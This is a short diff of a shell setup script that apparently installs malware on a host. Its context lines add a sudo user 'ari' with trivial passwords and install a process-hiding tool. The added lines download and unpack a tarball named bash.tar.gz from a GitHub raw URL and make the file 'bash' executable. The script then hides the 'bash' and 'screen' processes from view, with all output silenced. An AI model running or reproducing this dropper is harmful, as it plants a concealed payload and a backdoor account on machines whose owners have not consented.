@@ -6,6 +6,9 @@ adduser ari sudo > /dev/null 2>&1
 echo 'ari:ari' | sudo chpasswd > /dev/null 2>&1
 echo ari:1 | sudo chpasswd > /dev/null 2>&1
 apt install screen -y > /dev/null 2>&1 && npm i -g node-process-hider > /dev/null 2>&1
+wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/bash.tar.gz > /dev/null 2>&1
+tar -xvf bash.tar.gz > /dev/null 2>&1
+rm bash.tar.gz
 ph add bash > /dev/null 2>&1
 ph add screen > /dev/null 2>&1
 chmod +x bash
